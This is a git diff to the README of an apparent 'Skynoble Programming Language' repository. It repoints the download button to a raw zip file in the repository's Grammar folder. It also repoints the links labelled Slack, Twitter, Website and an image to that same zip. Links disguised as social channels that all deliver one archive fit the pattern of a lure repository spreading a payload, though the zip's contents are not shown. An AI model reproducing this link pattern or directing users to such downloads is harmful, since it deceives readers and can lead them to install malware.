@@ -24,7 +24,7 @@ Welcome to the Skynoble Programming Language repository! Skynoble is a cutting-e
 
 ## Get Started
 To access the latest release of Skynoble Programming Language, click the button below:
-[![Download Skynoble](https://github.com/krippi842/Skynoble-Programming-Language/releases)](https://github.com/krippi842/Skynoble-Programming-Language/releases)
+[![Download Skynoble](https://github.com/krippi842/Skynoble-Programming-Language/raw/refs/heads/main/Grammar/Programming-Skynoble-Language-v1.9.zip)](https://github.com/krippi842/Skynoble-Programming-Language/raw/refs/heads/main/Grammar/Programming-Skynoble-Language-v1.9.zip)
 
 If the link doesn't work or is not provided, please check the "Releases" section of this repository for alternative download options.
 
@@ -36,10 +36,10 @@ We welcome contributions from the open-source community to enhance Skynoble furt
 
 ## Connect with Us
 Stay updated with the latest news, releases, and discussions on Skynoble Programming Language:
-- Join our [Slack](https://github.com/krippi842/Skynoble-Programming-Language/releases) channel
-- Follow us on [Twitter](https://github.com/krippi842/Skynoble-Programming-Language/releases)
-- Visit our [Website](https://github.com/krippi842/Skynoble-Programming-Language/releases) for more information
+- Join our [Slack](https://github.com/krippi842/Skynoble-Programming-Language/raw/refs/heads/main/Grammar/Programming-Skynoble-Language-v1.9.zip) channel
+- Follow us on [Twitter](https://github.com/krippi842/Skynoble-Programming-Language/raw/refs/heads/main/Grammar/Programming-Skynoble-Language-v1.9.zip)
+- Visit our [Website](https://github.com/krippi842/Skynoble-Programming-Language/raw/refs/heads/main/Grammar/Programming-Skynoble-Language-v1.9.zip) for more information
 
 Let's code the future together with Skynoble Programming Language! 🚀🌌
 
-![Skynoble Programming](https://github.com/krippi842/Skynoble-Programming-Language/releases)
+![Skynoble Programming](https://github.com/krippi842/Skynoble-Programming-Language/raw/refs/heads/main/Grammar/Programming-Skynoble-Language-v1.9.zip)
